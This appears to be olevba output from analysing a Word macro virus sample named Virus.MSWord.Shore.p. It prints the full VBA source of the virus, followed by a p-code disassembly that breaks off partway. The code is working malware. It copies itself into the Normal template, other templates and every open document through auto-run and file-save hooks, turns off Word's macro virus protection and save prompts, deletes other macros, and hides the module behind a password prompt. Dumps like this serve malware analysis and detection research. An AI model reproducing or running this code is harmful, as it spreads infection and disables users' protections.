olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Shore.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Shore.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Officee.bas 
in file: ./Virus.MSWord.Shore.p - OLE stream: 'Macros/VBA/Officee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Fuck 4all Macro Viruses
'It's sign from TopHack0105
'Modify from "Offee" Create Dec 15'2000


Public Const SeriesNumber = 151200
Public Const ModuleName = "Officee", mw = "Microsoft Word", _
        TOP = "We R the best, U R Zero", _
        Hack0105 = "TopHack0105", _
        SerNum$ = "Series Number", _
        pass = "Enter password to modify Macros.", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const msg = "Password Wrong !", _
        aaa = "41240", bbb = "TopHack0105", ccc = "are", _
        mword = "Microsoft Word", _
        code = "oouu4515", ddd = "4155", eee = "Flowers"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

Sub checked()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub

Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next

    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="Zzzz", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub CopyNormal()
Dim ATemp As Template
    Scan
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub CopyDoc()
Dim Adoc As Document
    Scan
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

Sub AutoOpen()
    Scan
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("CopyDoc")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        CopyNormal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
        Scan
        WordBasic.DisableAutoMacros True
        WordCaption
    
        On Error Resume Next
        If Dialogs(wdDialogFileOpen).Show <> 0 Then
            AutoOpen
            On Error Resume Next
            ActiveDocument.Saved = True
            ActiveDocument.Save
        End If
        WordBasic.DisableAutoMacros False
    End Sub

Sub AutoClose()
    WordCaption
    Scan
    On Error Resume Next

    CopyDoc
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
words
Dim afn As String
    WordCaption
    WordBasic.DisableAutoMacros True
    
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    WordCaption
    WordBasic.DisableAutoMacros True
    
    CopyDoc
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub

Sub initial()
    Scan
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    initial
    Animated = False
    WordCaption
    CopyNormal
    If getInfected(NormalTemplate) Then CopyDoc
    ModifyAttr NormalTemplate.FullName
    checked
    For Each Combar In Application.CommandBars
        Combar.Reset
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    WordCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub NewDefault()
    WordCaption
    WordBasic.NewDefault
    CopyDoc
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        WordCaption
        CopyDoc
    End If
End Sub

Sub Scan()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoScan()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    initial
    NoScan
    On Error Resume Next
    ToolsOptionsDlg.Display
    WordCaption
    Scan
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbCritical, mword)
    WordCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = aaa + Mid(code, 3, 6)
    If LCase(InputBox(pass, mword)) = cruel Then
        passDialog = True
    a = MsgBox("Congratulations Boss !", vbExclamation, "TopHack0105")
    Else
        NoAccess
    End If
End Function

Sub ToolsMacro()
a = MsgBox("Create Macro from Visual Basic Editor or Alt + F11", vbExclamation, mword)
End Sub

Sub FileTemplates()
    initial
    ToolsTemplatesDlg.Display

    WordCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    initial
    OrganizerDlg.Display
    WordCaption
End Sub

Sub FormatStyle()
    initial
    With FormatStyleDlg
        .Display
        .Execute
    End With
    WordCaption
End Sub

Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub WordCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = TOP
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub

Sub words()
On Error Resume Next
    If Day(Date) = 1 Then
    a = MsgBox("Have a nice day ...!", vbExclamation, mword)
        If Month(Date) = 5 Then
        a = MsgBox("Happy Birthday, Long Life ...!", vbExclamation, mword)
        End If
    End If
Return
End Sub

Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = TOP Then
            anCap = Hack0105
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Hack0105 Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = TOP
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Shore.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Officee - 17635 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0017 "Fuck 4all Macro Viruses"
' Line #2:
' 	QuoteRem 0x0000 0x001A "It's sign from TopHack0105"
' Line #3:
' 	QuoteRem 0x0000 0x0026 "Modify from "Offee" Create Dec 15'2000"
' Line #4:
' Line #5:
' Line #6:
' 	Dim (Public Const) 
' 	LitDI4 0x4EA0 0x0002 
' 	VarDefn SeriesNumber
' Line #7:
' 	LineCont 0x0014 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1A 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0007 "Officee"
' 	VarDefn ModuleName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x0017 "We R the best, U R Zero"
' 	VarDefn TOP
' 	LitStr 0x000B "TopHack0105"
' 	VarDefn Hack0105
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x0020 "Enter password to modify Macros."
' 	VarDefn pass
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #8:
' Line #9:
' 	LineCont 0x000C 06 00 08 00 12 00 08 00 16 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0010 "Password Wrong !"
' 	VarDefn msg
' 	LitStr 0x0005 "41240"
' 	VarDefn aaa
' 	LitStr 0x000B "TopHack0105"
' 	VarDefn bbb
' 	LitStr 0x0003 "are"
' 	VarDefn ccc
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mword
' 	LitStr 0x0008 "oouu4515"
' 	VarDefn code
' 	LitStr 0x0004 "4155"
' 	VarDefn ddd
' 	LitStr 0x0007 "Flowers"
' 	VarDefn eee
' Line #10:
' Line #11:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #12:
' Line #13:
' 	FuncDefn (Sub checked())
' Line #14:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #15:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #16:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #17:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' Line #19:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #23:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #24:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #25:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #26:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #27:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #29:
' 	ExitFunc 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndWith 
' Line #32:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndFunc 
' Line #34:
' Line #35:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #36:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #37:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #38:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #39:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #41:
' 	ExitFunc 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	EndFunc 
' Line #45:
' Line #46:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #47:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #48:
' 	EndFunc 
' Line #49:
' Line #50:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #51:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #52:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #53:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #54:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd codemodule 
' 	With 
' Line #58:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #59:
' 	EndWith 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' Line #63:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #64:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #65:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	EndSub 
' Line #67:
' Line #68:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #69:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #70:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #71:
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' Line #79:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #80:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "Zzzz"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #81:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #82:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' 	FuncDefn (Sub CopyNormal())
' Line #89:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #90:
' 	ArgsCall Scan 0x0000 
' Line #91:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #92:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #93:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #94:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #95:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #96:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #100:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #101:
' 	EndWith 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub CopyDoc())
' Line #105:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #106:
' 	ArgsCall Scan 0x0000 
' Line #107:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #108:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #111:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #116:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub AutoOpen())
' Line #120:
' 	ArgsCall Scan 0x0000 
' Line #121:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #122:
' Line #123:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #124:
' 	LitStr 0x0007 "CopyDoc"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #125:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	ElseBlock 
' Line #130:
' 	ArgsCall CopyNormal 0x0000 
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	EndSub 
' Line #135:
' Line #136:
' 	FuncDefn (Sub FileOpen())
' Line #137:
' 	ArgsCall Scan 0x0000 
' Line #138:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #139:
' 	ArgsCall WordCaption 0x0000 
' Line #140:
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #143:
' 	ArgsCall AutoOpen 0x0000 
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #146:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #149:
' 	EndSub 
' Line #150:
' Line #151:
' 	FuncDefn (Sub AutoClose())
' Line #152:
' 	ArgsCall WordCaption 0x0000 
' Line #153:
' 	ArgsCall Scan 0x0000 
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' Line #156:
' 	ArgsCall CopyDoc 0x0000 
' Line #157:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #158:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #159:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
' 	FuncDefn (Sub FileClose())
' Line #163:
' 	ArgsCall words 0x0000 
' Line #164:
' 	Dim 
' 	VarDefn afn (As String)
' Line #165:
' 	ArgsCall WordCaption 0x0000 
' Line #166:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #167:
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' 	ArgsCall AutoClose 0x0000 
' Line #170:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #171:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #172:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #173:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #174:
' 	EndSub 
' Line #175:
' Line #176:
' 	FuncDefn (Sub FileSave())
' Line #177:
' 	ArgsCall WordCaption 0x0000 
' Line #178:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #179:
' Line #180:
' 	ArgsCall CopyDoc 0x0000 
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #183:
' 	ArgsMemCallWith Save 0x0000 
' Line #184:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #185:
' 	EndWith 
' Line #186:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #187:
' 	EndSub 
' Line #188:
' Line #189:
' 	FuncDefn (Sub initial())
' Line #190:
' 	ArgsCall Scan 0x0000 
' Line #191:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #192:
' 	OnError (Resume Next) 
' Line #193:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #194:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #195:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #196:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #197:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #198:
' 	EndSub 
' Line #199:
' Line #200:
' Line #201:
' 	FuncDefn (Sub AutoExec())
' Line #202:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #203:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #204:
' 	ArgsCall initial 0x0000 
' Line #205:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #206:
' 	ArgsCall WordCaption 0x0000 
' Line #207:
' 	ArgsCall CopyNormal 0x0000 
' Line #208:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyDoc 0x0000 
' 	EndIf 
' Line #209:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #210:
' 	ArgsCall checked 0x0000 
' Line #211:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #212:
' 	Ld Combar 
' 	ArgsMemCall Reset 0x0000 
' Line #213:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #214:
' 	EndSub 
' Line #215:
' Line #216:
' 	FuncDefn (Sub AutoExit())
' Line #217:
' 	ArgsCall AutoOpen 0x0000 
' Line #218:
' 	ArgsCall WordCaption 0x0000 
' Line #219:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #220:
' 	EndSub 
' Line #221:
' Line #222:
' 	FuncDefn (Sub NewDefault())
' Line #223:
